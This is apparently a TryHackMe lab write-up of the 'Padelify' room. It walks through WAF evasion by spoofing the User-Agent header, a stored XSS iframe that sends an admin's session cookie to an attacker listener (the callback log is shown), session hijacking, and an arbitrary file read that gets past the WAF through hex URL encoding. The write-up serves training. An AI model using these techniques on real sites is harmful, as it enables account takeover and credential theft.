# Padelify: Write-up

**Platform:** TryHackMe  
**Room:** Padelify  
**Difficulty:** Medium  
**Goal:** Bypass WAF protection and obtain administrative access.

---

## Recon and Enumeration

**Host mapping:** `padelify.thm` was mapped to `<TARGET_IP>` via `/etc/hosts`.

### Nmap (Service Detection)

```bash
└─$ nmap -n -Pn -sCV --min-rate 500 <TARGET_IP>
```

**Result (summary):** `22/tcp (SSH)` and `80/tcp (HTTP)` were exposed. The HTTP response set `PHPSESSID` without the `HttpOnly` flag.

**Key Finding:** The `PHPSESSID` cookie is missing the `HttpOnly` flag. This increases the potential impact if an XSS vulnerability exists, as JavaScript would be able to access `document.cookie` for session exfiltration.

---

### Fingerprinting & WAF Analysis

Initial identification with `whatweb`:

```bash
└─$ whatweb http://<TARGET_IP>
```

**Observed Behavior:** A direct `curl` returns a `403 Forbidden` ("WAF ACTIVE"). However, requests with browser-like headers return `200 OK`. This suggests the WAF utilizes **request profiling** (tool fingerprinting) rather than simple endpoint-based blocking.

**Practical note:** I reproduced the browser header profile in Burp/ffuf requests to avoid 403 responses during enumeration.

---

### Fuzzing and Directory Discovery

Using `ffuf` with a custom `User-Agent` to evade profiling:

```bash
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -H 'User-Agent: Mozilla/5.0' \
  -u http://padelify.thm/FUZZ
```

**Relevant Routes:**
* `register.php` / `login.php`: Main auth entry points.
* `/config/`: Directory listing enabled (revealed `app.conf`).
* `/logs/error.log`: Information disclosure.

---

## Exploitation

### Stored XSS via Approval Workflow

The application requires moderator approval for new registrations. This suggests an administrative panel where user-supplied data is rendered, creating a vector for Stored XSS.

#### Payload Execution

An `<iframe>` with a Base64-encoded payload was injected into the registration fields to exfiltrate the session cookie to an attacker-controlled listener.

**Injection Example:**

```html
<iframe src="javascript:eval(atob('[REDACTED_BASE64_PAYLOAD]'))"></iframe>
```

#### Callback Captured

```text
connect to [<ATTACKER_IP>] from (UNKNOWN)
GET /PHPSESSID=[REDACTED] HTTP/1.1
User-Agent: Mozilla/5.0 (Linux; Android 10; K) ...
Origin: http://localhost
```

### Session Hijacking

By importing the captured `PHPSESSID` into the browser, access to the administrative dashboard was granted. **Flag 1** was retrieved.

---

## Post-Exploitation

### Arbitrary File Read via `live.php` (WAF Bypass)

The `live.php?page=` parameter was found to be vulnerable to **arbitrary file read**. While direct paths were blocked by the WAF, a bypass was achieved using **full URL encoding** (hex encoding every character).

**Bypass Payload:**

`http://padelify.thm/live.php?page=%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66`

**Exfiltrated `app.conf` Content:**

```ini
admin_info = "[REDACTED_ADMIN_PASS]"
db_path = "padelify.sqlite"
env = "staging"
```

The `admin_info` value was subsequently used as the administrator password in the standard UI login flow, confirming full account takeover. **Flag 2** was retrieved from the landing page.

---

